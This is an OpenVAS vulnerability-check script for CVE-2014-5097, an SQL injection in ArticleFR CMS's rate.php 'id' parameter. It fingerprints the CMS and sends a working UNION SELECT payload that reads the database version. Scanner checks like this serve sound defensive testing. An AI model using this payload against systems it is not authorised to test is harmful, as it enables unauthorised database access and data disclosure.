if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804819" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2014-5097" );
	script_bugtraq_id( 69307 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2014-08-25 18:58:36 +0530 (Mon, 25 Aug 2014)" );
	script_name( "ArticleFR CMS 'id' Parameter SQL Injection Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with ArticleFR CMS and is prone to sql injection
  vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and check whether it is able to execute
  sql query or not." );
	script_tag( name: "insight", value: "Flaw is due to the '/rate.php' script not properly sanitizing user-supplied
  input to the 'id' parameter." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to manipulate SQL queries in the
  backend database allowing for the manipulation or disclosure of arbitrary data." );
	script_tag( name: "affected", value: "ArticleFR CMS version 3.0.4 and earlier." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "https://www.htbridge.com/advisory/HTB23225" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/127943" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/archive/1/533183/100/0/threaded" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 80 );
if(!http_can_host_php( port: http_port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/articleFR", "/cms", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/index.php" ), port: http_port );
	if(rcvRes && IsMatchRegexp( rcvRes, "Powered by.*>ArticleFR" )){
		url = dir + "/rate.php?act=set&id=0%20union%20select%201,version%28%2" + "9,3,4%20--%202";
		if(http_vuln_check( port: http_port, url: url, pattern: "scored.*from.([0-9.]+)" )){
			report = http_report_vuln_url( port: http_port, url: url );
			security_message( port: http_port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

